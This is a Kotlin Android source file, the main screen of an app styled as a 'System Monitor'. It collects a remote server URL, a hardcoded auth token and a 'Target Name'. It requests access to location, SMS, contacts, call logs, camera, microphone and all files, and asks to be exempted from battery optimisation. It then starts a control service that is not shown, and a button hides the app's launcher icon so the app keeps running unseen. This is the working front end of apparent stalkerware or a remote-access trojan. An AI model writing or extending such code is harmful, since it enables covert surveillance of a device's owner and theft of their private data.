package com.example.devicecontrol

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Environment

class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_PERMISSIONS = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Root layout - Dark Theme Futuristic
        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 120, 64, 64)
            gravity = Gravity.CENTER_HORIZONTAL
            setBackgroundColor(Color.parseColor("#0F172A")) // Slate 900
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        // Header
        val header = TextView(this).apply {
            text = "SYSTEM MONITOR"
            textSize = 24f
            setTextColor(Color.parseColor("#38BDF8")) // Cyan Accent
            letterSpacing = 0.1f
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 80)
        }
        rootLayout.addView(header)

        // Preferences for Config
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)

        fun createInputBox(hintText: String, defaultVal: String, marginB: Int): EditText {
            return EditText(this).apply {
                hint = hintText
                setText(defaultVal)
                setHintTextColor(Color.parseColor("#64748B"))
                setTextColor(Color.parseColor("#F8FAFC"))
                setPadding(40, 40, 40, 40)
                textSize = 14f
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { setMargins(0, 0, 0, marginB) }
                
                background = GradientDrawable().apply {
                    setColor(Color.parseColor("#1E293B"))
                    cornerRadius = 24f
                    setStroke(2, Color.parseColor("#334155"))
                }
            }
        }

        // Inputs
        val urlInput = createInputBox("Server URL", prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: "", 32)
        val authInput = createInputBox("Auth Token", prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: "", 32)
        val idInput = createInputBox("Target Name (ID)", prefs.getString("device_id", "my_phone") ?: "", 64)
        
        rootLayout.addView(urlInput)
        rootLayout.addView(authInput)
        rootLayout.addView(idInput)

        // Status
        val statusText = TextView(this).apply {
            text = "Status: INACTIVE"
            textSize = 14f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, 0, 0, 64)
            gravity = Gravity.CENTER
        }
        rootLayout.addView(statusText)

        // Function for Buttons
        fun createActionBtn(btnText: String, hexBg: String, hexStroke: String = ""): Button {
            return Button(this).apply {
                text = btnText
                setTextColor(Color.parseColor("#F8FAFC"))
                textSize = 14f
                setTypeface(null, android.graphics.Typeface.BOLD)
                setPadding(0, 44, 0, 44)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { setMargins(0, 24, 0, 0) }
                
                background = GradientDrawable().apply {
                    setColor(Color.parseColor(hexBg))
                    cornerRadius = 24f
                    if (hexStroke.isNotEmpty()) setStroke(3, Color.parseColor(hexStroke))
                }
            }
        }

        // Start Button
        val startButton = createActionBtn("ACTIVATE SERVICE", "#0284C7").apply {
            setOnClickListener {
                val url = urlInput.text.toString().trim()
                val devId = idInput.text.toString().trim()
                val authToken = authInput.text.toString().trim()
                
                if (url.isEmpty()) {
                    Toast.makeText(this@MainActivity, "URL is required", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }

                prefs.edit().apply {
                    putString("ws_url", url)
                    putString("device_id", devId)
                    putString("auth_token", authToken)
                    apply()
                }

                statusText.text = "Status: ENGAGED & MONITORING"
                statusText.setTextColor(Color.parseColor("#34D399")) // Green
                checkAndStartService()
            }
        }
        rootLayout.addView(startButton)

        // Hide App Button
        val hideButton = createActionBtn("HIDE SYSTEM APP", "#0F172A", "#E11D48").apply {
            setOnClickListener {
                if (Toast.makeText(this@MainActivity, "App icon will vanish now...", Toast.LENGTH_SHORT).show().run { true }) {
                    val pm = packageManager
                    
                    // Menonaktifkan Alias (Topeng Ikon Utama)
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(this@MainActivity, "com.example.devicecontrol.LauncherAlias"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    
                    // Menonaktifkan Activity Inti (Mencegah Ikon tersisa dipencet lagi)
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(this@MainActivity, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    
                    // Keluar dari UI Aplikasi dan lenyap
                    finishAffinity()
                }
            }
        }
        rootLayout.addView(hideButton)

        setContentView(rootLayout)
        checkPermissions()
    }

    private fun checkPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE
        )
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        
        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), REQUEST_CODE_PERMISSIONS)
        }

        // Meminta user mematikan optimasi baterai (Doze) untuk aplikasi ini
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        }

        // Meminta Akses Sistem Berkas Penuh (Manage External Storage) untuk Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
        }
    }

    private fun checkAndStartService() {
        val intent = Intent(this, ControlService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Failed to start service: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
